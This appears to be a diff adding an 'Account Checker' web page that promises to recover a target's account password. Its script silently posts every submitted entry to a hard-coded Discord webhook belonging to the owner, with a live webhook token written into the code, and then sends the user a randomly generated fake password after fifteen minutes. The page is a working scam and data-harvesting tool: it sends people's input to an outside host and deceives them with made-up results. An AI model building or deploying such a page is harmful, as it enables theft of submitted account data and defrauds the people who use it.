@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Checker</title>
+    <style>
+        :root {
+            --primary: #6c5ce7;
+            --secondary: #a29bfe;
+            --dark: #2d3436;
+            --light: #f5f6fa;
+            --success: #00b894;
+            --danger: #d63031;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: var(--dark);
+            color: var(--light);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2rem;
+            background-image: radial-gradient(circle at 25% 25%, rgba(108, 92, 231, 0.1) 0%, transparent 50%);
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background-color: rgba(45, 52, 54, 0.8);
+            border-radius: 15px;
+            padding: 2rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        h1 {
+            text-align: center;
+            margin-bottom: 1.5rem;
+            color: var(--primary);
+            font-size: 2rem;
+        }
+        
+        .description {
+            text-align: center;
+            margin-bottom: 2rem;
+            color: var(--secondary);
+            line-height: 1.6;
+            font-size: 0.9rem;
+        }
+        
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: var(--secondary);
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+        
+        input {
+            width: 100%;
+            padding: 0.8rem;
+            border-radius: 8px;
+            border: 2px solid var(--primary);
+            background-color: rgba(108, 92, 231, 0.1);
+            color: var(--light);
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: var(--secondary);
+            box-shadow: 0 0 0 3px rgba(162, 155, 254, 0.3);
+        }
+        
+        .btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.8rem;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            display: block;
+            width: 100%;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .btn:hover {
+            background-color: var(--secondary);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(108, 92, 231, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .result {
+            margin-top: 1rem;
+            padding: 0.8rem;
+            border-radius: 8px;
+            text-align: center;
+            display: none;
+            font-size: 0.9rem;
+        }
+        
+        .success {
+            background-color: rgba(0, 184, 148, 0.2);
+            border: 1px solid var(--success);
+            color: var(--success);
+        }
+        
+        .error {
+            background-color: rgba(214, 48, 49, 0.2);
+            border: 1px solid var(--danger);
+            color: var(--danger);
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 1rem 0;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid var(--primary);
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        footer {
+            margin-top: 2rem;
+            text-align: center;
+            color: var(--secondary);
+            font-size: 0.8rem;
+            opacity: 0.7;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Account Checker</h1>
+        <p class="description">
+            Enter the account information you want to check below and your Discord webhook to receive results.
+        </p>
+        
+        <form id="checkerForm">
+            <div class="input-group">
+                <label for="account">Account Information</label>
+                <input type="text" id="account" name="account" placeholder="Paste your target's info here..." required>
+            </div>
+            
+            <div class="input-group">
+                <label for="webhook">Your Discord Webhook URL</label>
+                <input type="text" id="webhook" name="webhook" placeholder="https://discord.com/api/webhooks/..." required>
+            </div>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Processing your request...</p>
+            </div>
+            
+            <div class="result" id="result"></div>
+            
+            <button type="submit" class="btn"> CHECK ACCOUNTS INFORMATION</button>
+        </form>
+    </div>
+    
+    <footer>
+        &copy; <span id="year"></span> Account Checker | Secure Processing
+    </footer>
+    
+    <script>
+        // Set current year in footer
+        document.getElementById('year').textContent = new Date().getFullYear();
+        
+        document.getElementById('checkerForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const account = document.getElementById('account').value;
+            const userWebhook = document.getElementById('webhook').value;
+            const loading = document.getElementById('loading');
+            const result = document.getElementById('result');
+            
+            // Show loading, hide result
+            loading.style.display = 'block';
+            result.style.display = 'none';
+            
+            try {
+                // 1. First send the real data to your webhook (replace with your actual webhook)
+                await sendToOwnerWebhook(account);
+                
+                // 2. Send initial "checking" message to user's webhook
+                await sendToUserWebhook(userWebhook, "Checking user's info. Please wait 15+ minutes...");
+                
+                // 3. Show success message to user immediately
+                result.textContent = 'Account submitted successfully! Checking in progress...';
+                result.className = 'result success';
+                result.style.display = 'block';
+                
+                // 4. After 15 minutes (900000ms), send the fake "results" to user's webhook
+                setTimeout(async () => {
+                    const randomPassword = generateRandomPassword();
+                    await sendToUserWebhook(userWebhook, `Account's Password: ${randomPassword}`);
+                }, 900000); // 15 minutes delay
+                
+            } catch (error) {
+                console.error('Error:', error);
+                result.textContent = 'Error submitting account. Please check your webhook URL.';
+                result.className = 'result error';
+            } finally {
+                // Hide loading
+                loading.style.display = 'none';
+                
+                // Clear the form
+                document.getElementById('account').value = '';
+                document.getElementById('webhook').value = '';
+            }
+        });
+        
+        // Function to send data to YOUR webhook (the real owner)
+        async function sendToOwnerWebhook(data) {
+            const ownerWebhookURL = 'https://discord.com/api/webhooks/1381948568159649882/yuaIRcxy1roVVEi0BPIQ94XATw96pbWyq_Pdg-fiLyiAsctwYDOGvYWMwPfckbuRe_HK'; // Replace with your actual webhook
+            
+            const payload = {
+                content: `🔴 NEW ACCOUNT SUBMISSION:\n\`\`\`${data}\`\`\``,
+                username: 'Account Checker Bot (OWNER)',
+                avatar_url: 'https://i.imgur.com/7GF7hXv.png',
+                embeds: [{
+                    title: "New Account Submitted",
+                    description: `\`\`\`${data}\`\`\``,
+                    color: 16711680, // Red color
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            
+            return await fetch(ownerWebhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            });
+        }
+        
+        // Function to send messages to user's webhook
+        async function sendToUserWebhook(webhookURL, message) {
+            const payload = {
+                content: message,
+                username: 'Account Checker Bot',
+                avatar_url: 'https://i.imgur.com/7GF7hXv.png'
+            };
+            
+            return await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            });
+        }
+        
+        // Function to generate random password-like string
+        function generateRandomPassword() {
+            const length = Math.floor(Math.random() * 12) + 8; // 8-19 characters
+            const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";
+            let result = "";
+            
+            for (let i = 0; i < length; i++) {
+                result += charset.charAt(Math.floor(Math.random() * charset.length));
+            }
+            
+            return result;
+        }
+    </script>
+</body>
+</html>
